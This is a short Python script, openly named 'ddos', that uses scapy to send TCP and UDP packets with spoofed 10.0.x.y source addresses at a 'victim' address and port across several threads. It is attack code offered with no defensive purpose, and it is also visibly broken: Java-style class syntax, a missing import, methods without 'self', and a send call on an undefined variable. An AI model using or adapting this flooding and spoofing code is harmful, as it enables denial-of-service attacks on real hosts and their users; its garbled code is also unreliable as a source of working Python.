from scapy.all import *
from threading import Thread

class ddos extends threading.Thread:


	def sendPackets(subnetMin,subnetMax,victimAddress,victimPort):
		for i in range(subnetMin,subnetMax):
			for j in range(1,255):
				packetTCP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/TCP(dport=victimPort, flags=0x00)
				packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=victimPort)
				send(packet)
				print("victim sees 10.0." + str(i) + "." + str(j))

	def startDDOS(victimAddress,victimPort,numThreads):
		for i in range(1,numThreads):
			threadRange = 256/numThreads
			rangeMin = i*threadRange - (threadRange-1)
			rangeMax = i*threadRange
			thread = Thread(target=sendPackets,args=(rangeMin,rangeMax,victimAddress,victimPort))
			thread.start()
